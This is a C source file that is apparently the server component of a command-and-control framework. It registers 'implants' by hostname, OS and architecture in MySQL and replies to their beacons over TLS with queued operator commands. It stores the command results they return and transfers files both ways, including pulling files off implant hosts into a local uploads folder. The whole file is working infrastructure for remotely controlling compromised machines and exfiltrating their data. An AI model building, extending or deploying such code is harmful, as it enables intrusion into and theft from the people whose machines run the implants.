#include "implant_handler.h"

#include <openssl/err.h>
#include <openssl/ssl.h>
//#include "./cJSON/cJSON.h"
#include <cjson/cJSON.h>
#include <fcntl.h>

#include "logs.h"
#include "db.h"
#include "common.h"

char* GenerateID(cJSON *json) {
	char output[9];
	cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
    	if (!hostname) {
    	    return NULL;
    	}

    	cJSON *os =  cJSON_GetObjectItem(json, "os");
    	if (!os) {
    	    return NULL;
    	}

    	cJSON *arch = cJSON_GetObjectItem(json, "arch");
    	if (!arch) {
    	    return NULL;
    	}

    	char input[255];
    	snprintf(input, sizeof(input), "%s-%s-%s", hostname->valuestring, os->valuestring, arch->valuestring);


    	unsigned char hash1[SHA256_DIGEST_LENGTH];
    	char sha256_string[65];
    	SHA256((unsigned char *)input, strlen(input), hash1);

    	for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
    	    sprintf(sha256_string + (i * 2), "%02x", hash1[i]);
    	}
    	sha256_string[64] = 0;

    	uint8_t hash[SHA256_DIGEST_LENGTH];
    	SHA256((const unsigned char *)sha256_string, strlen(sha256_string), hash);

    	// Use first 6 bytes of hash (48 bits)
    	uint64_t val = 0;
    	for (int i = 0; i < 6; i++) {
    	    val = (val << 8) | hash[i];
    	}
    	// Convert to base62 (8 characters)
    	for (int i = 7; i >= 0; i--) {
    	    output[i] = base62[val % 62];
    	    val /= 62;
    	}
    	output[8] = '\0';
	return strdup(output);
}


void register_implant(MYSQL* con, cJSON *json, char *ip) {
    	cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
    	if (!hostname) {
    	    return;
    	}

    	cJSON *os =  cJSON_GetObjectItem(json, "os");
    	if (!os) {
    	    return;
    	}

    	cJSON *arch = cJSON_GetObjectItem(json, "arch");
    	if (!arch) {
    	    return;
    	}
    	char *implant_id = GenerateID(json);
	
    	if (check_implant_id(con, implant_id) == 1) goto DONE;
    	log_message(LOG_INFO, "New Implant Registration (TCP): implant_id = %s, hostname = %s, os = %s, arch = %s", implant_id,  hostname->valuestring, os->valuestring, arch->valuestring);

    	struct db_agents args;
    	strncpy(args.implant_id, implant_id, sizeof(args.implant_id) - 1);
    	args.implant_id[sizeof(args.implant_id) - 1] = '\0';
    	strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
    	args.os[sizeof(args.os) - 1] = '\0';
    	strncpy(args.ip, ip, sizeof(args.ip) - 1);
    	args.ip[sizeof(args.ip) - 1] = '\0';
    	strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
    	args.hostname[sizeof(args.hostname) - 1] = '\0';
    	strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
    	args.arch[sizeof(args.arch) - 1] = '\0';
    	new_implant(con, args);

    	DONE:
    	return;
}

char *beacon_implant(MYSQL* con, cJSON *json, char *ip) {

    	cJSON *json_reply = cJSON_CreateObject();
	char *implant_id = GenerateID(json);
    	if (check_implant_id(con, implant_id) == 0) {
		/// id does not exist register to database

		register_implant(con, json, ip);
    	    	cJSON_AddStringToObject(json_reply, "mode", "none");
    	    	char *reply = cJSON_Print(json_reply);
    	    	cJSON_Delete(json_reply);
    	    	return reply;
    	}

    	update_last_seen(con, implant_id);

    	log_message(LOG_INFO, "Beacon Implant From %s", implant_id);

    	// check if there are tasks queue for agent
    	// change this so that it stores all qeues in a data structure to optimize 
    	int task_id = check_tasks_queue(con, implant_id);
    	if (task_id == -1) {
    	    cJSON_AddStringToObject(json_reply, "mode", "none");
    	    char *reply = cJSON_Print(json_reply);
    	    cJSON_Delete(json_reply);
    	    return reply;
    	} else {
    	    	char *cmd =  get_task(con, task_id);
    	    	if (cmd != NULL) {
    	    	    	cJSON_AddStringToObject(json_reply, "command", cmd);
    	    	} else {
    	    	     	cJSON_AddStringToObject(json_reply, "mode", "none");
			      	char *reply = cJSON_Print(json_reply);
    	    		cJSON_Delete(json_reply);
    	    		return reply;
    	    	}
    	    	cJSON_AddStringToObject(json_reply, "mode", "task");
    	    	//cJSON_AddStringToObject(json_reply, "task_id", task_id);
    	    	cJSON_AddNumberToObject(json_reply, "task_id", task_id);
    	    	//cJSON_AddStringToObject(json_reply, "implant_id", implant_id->valuestring);
	    

    	    	char *reply = cJSON_Print(json_reply);
	    
    	    	//if command = "upload [file path]" | upload file to agent 
    	    	//if command = "download [file path]" | download file from agent
    	    	//if (strncmp(cmd, "download", 8) ==0 || strncmp(cmd, "upload", 6) == 0) {
    	    	//    char file[BUFFER_SIZE];
    	    	//    char command[BUFFER_SIZE];
    	    	//    if (sscanf(cmd, "%s %s", command, file) == 2) {
    	    	//        if (strncmp(command, "download", 8) == 0) {
    	    	//            download(file);
    	    	//        } else {
    	    	//            upload(file);
    	    	//        }
    	    	//    }
    	    	//}
    	    	free(cmd);
    	    	cJSON_Delete(json_reply);
			printf("Done");
    	    	return reply;
    	}
}	


void *implant_handler(void *args) {

    	struct implant_handler_t *arg = (struct implant_handler_t*)args;
	
	
    	MYSQL *con = get_db_connection();
	
    	if (con == NULL) {
    	    log_message(LOG_ERROR, "Failed to get DB connection from pool");
    	    return NULL;
    	}
    
    	// Check if connection is still alive
    	if (mysql_ping(con) != 0) {
    	    log_message(LOG_WARN, "DB connection lost, reconnecting...");
    	    return NULL;
    	}

    
	SSL_CTX *ctx  = arg->ctx;
	int client_fd = arg->client_fd;

	SSL *ssl = SSL_new(ctx);
	if (!ssl) {
	    fprintf(stderr, "[!] SSL_new failed\n");
	    close(client_fd);
	    free(arg);
	    return NULL;
	}

	if (SSL_set_fd(ssl, client_fd) != 1) {
	    log_message(LOG_ERROR, "SSL_set_fd failed");
	    SSL_free(ssl);
	    close(client_fd);
	    free(arg);
	    return NULL;
	}

	if (SSL_accept(ssl) != 1) {
	    log_message(LOG_ERROR, "SSL_accept failed");
	    ERR_print_errors_fp(stderr);
	    SSL_free(ssl);
	    close(client_fd);
	    free(arg);
	    return NULL;
	}

	char buffer[MAX_RESPONSE];
	int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
	if (bytes_received <= 0) {
	    log_message(LOG_ERROR, "SSL_read failed");
	    ERR_print_errors_fp(stderr);
	    SSL_shutdown(ssl);
	    SSL_free(ssl);
	    close(client_fd);
	    free(arg);
	    return NULL;
	}
	buffer[bytes_received] = '\0';	
	cJSON *json = cJSON_Parse(buffer);
	if (!json) {
	    //fprintf(stderr, "[!] Error parsing JSON\n");
	    log_message(LOG_WARN, "Error parsing JSON (TCP [SSL] Handler)");
	    SSL_shutdown(ssl);
	    SSL_free(ssl);
	    close(client_fd);
	    free(arg);
	    return NULL;
	}	

	char *reply = beacon_implant(con, json, arg->ip);
	SSL_write(ssl, reply, strlen(reply));
	cJSON *check_mode = cJSON_Parse(reply);
	free(reply);
	if (!check_mode) {
	    log_message(LOG_WARN, "Error parsing json [SSL Beacon]");
	    goto CLEANUP;
	}
	cJSON *mode = cJSON_GetObjectItem(check_mode, "mode");
	if (strncmp(mode->valuestring, "none", 4) == 0) return NULL;	
	cJSON *cmd = cJSON_GetObjectItem(check_mode, "command");
	char file[BUFFER_SIZE];
	strncpy(file, cmd->valuestring, BUFFER_SIZE - 1);
	if (strncmp(file, "upload", 6) == 0) {
	    upload_to_implant(ssl, file + 7);
	} else if (strncmp(file, "download", 8) == 0) {
	    download_from_implant(ssl);
	}

	memset(buffer, 0, sizeof(buffer));
	bytes_received = SSL_read(ssl, buffer, sizeof(buffer)-1);
	if (bytes_received <= 0) {
	    log_message(LOG_ERROR, "Failed to receive data [SSL Beacon]");
	    goto CLEANUP;
	}
	buffer[bytes_received] = '\0'; 
	cJSON *response = cJSON_Parse(buffer);
	if (!response) {
	    log_message(LOG_WARN, "Error parsing json [SSL Beacon]");
	    goto CLEANUP;
	}
	cJSON *command_response = cJSON_GetObjectItem(response, "response");
	if (!command_response) {
	    log_message(LOG_ERROR, "Invalid or missing key [response]" );
	    cJSON_Delete(response);
	    return NULL;
	}
	cJSON *task_id = cJSON_GetObjectItem(response, "task_id");
	if (!task_id) {
	    log_message(LOG_ERROR, "Invalid or missing key [task_id]" );
	    cJSON_Delete(response);
	    return NULL;
	}
	store_task_response(con, command_response->valuestring, task_id->valueint);
	cJSON_Delete(response);

	CLEANUP: 
	cJSON_Delete(json);
	SSL_shutdown(ssl);
	SSL_free(ssl);
	close(client_fd);
	free(arg);
	return NULL;
}


// send file to implant
int download_from_implant(SSL *ssl) {
        // check if folder exists
        //if (check_if_dir_exists("./uploads/implant/") == false) {
        //    if (create_dir("./uploads/implant") == false) {
        //        return -1;
        //    }
        //}
        char filename[BUFFER_SIZE];
        SSL_read(ssl, filename, sizeof(filename) -1);

    
        log_message(LOG_INFO, "Receiving file with name : %s", filename);

        char *contents = (char*)malloc(MAX_INFO);
        if (contents == NULL) {
            log_message(LOG_ERROR, "Failed to allocate memory");
            return -1;
        }
        char filepath[BUFFER_SIZE + 32]; // = "./uploads_operator";
        
        snprintf(filepath, sizeof(filepath), "./uploads/implant/%s", filename);
    
        int fd = open(filepath, O_WRONLY|O_CREAT|O_TRUNC, 0644);
        if (fd == -1) {
            log_message(LOG_ERROR, "Failed To Create File Descriptor For The Following FILE PATH : %s", filepath);
            return -1;
        }
    
        log_message(LOG_INFO, "Writing To File : %s ", filepath);
        int bytesRead;
        size_t filesize;
        char FileSize[BUFFER_SIZE];
        SSL_read(ssl, FileSize, sizeof(FileSize));

        filesize =  (size_t)atoi(FileSize);

        size_t received = 0;
        //while (received < filesize) {
        //    bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
        //    //write(fd, contents, bytesRead);
        //    if (write(fd, contents, bytesRead) != bytesRead) {
        //        continue;
        //    }
        //    received += bytesRead;
        //}
        ssize_t bytesWritten;
        while (received < filesize) {
    bytesRead = SSL_read(ssl, contents, FILE_CHUNK);

    if (bytesRead <= 0) {
        int err = SSL_get_error(ssl, bytesRead);
        if (err == SSL_ERROR_ZERO_RETURN) {
            log_message(LOG_ERROR, "SSL connection closed cleanly.\n");
            break;
        } else {
            log_message(LOG_ERROR, "SSL_read error: %d\n", err);
            
            break;
        }
    }

    ssize_t totalWritten = 0;
    while (totalWritten < bytesRead) {
        bytesWritten = write(fd, contents + totalWritten, bytesRead - totalWritten);
        if (bytesWritten < 0) {
            log_message(LOG_ERROR, "Write Failed");
            return -1;
        }
        totalWritten += bytesWritten;
    }

    received += bytesRead;
}


        log_message(LOG_INFO, "Wrote Data To File : %s ", filepath);
        free(contents);
        return 0;
}


// send download file to imlant
int upload_to_implant(SSL *ssl, char* filename) {
    //look for file 
    char *filepath_ = search_file("./uploads/operator", filename);
    if (filepath_ == NULL) {
        log_message(LOG_ERROR, "File Does Not Exist filename - %s", filename);
        return -1;
    }

    char *contents = (char*)malloc(MAX_INFO);
    if (contents == NULL) {
        log_message(LOG_ERROR, "[Upload File] failed to allocate memory");
        return -1;
    }

    SSL_write(ssl, filename, strlen(filename) -1);


    char filepath[BUFFER_SIZE + 256];
    snprintf(filepath, sizeof(filepath), "./uploads/%s", filename);

    int fd = open(filepath, O_RDONLY);
    if (fd == -1) {
        log_message(LOG_ERROR, "[Upload file] Failed to open file descriptor for : %s", filepath);
        return -1;
    }
    log_message(LOG_INFO, "Uploading %s", filename);

    // send file size
    struct stat st;
    fstat(fd, &st);
    size_t filesize = st.st_size;
    SSL_write(ssl, &filesize, sizeof(filesize));

    size_t bytesRead;
    while ((bytesRead = read(fd, contents, FILE_CHUNK)) > 0) {
        SSL_write(ssl, contents, bytesRead);
    }
    
    log_message(LOG_INFO, "Upload Completed");
    free(contents);
    return 0;
}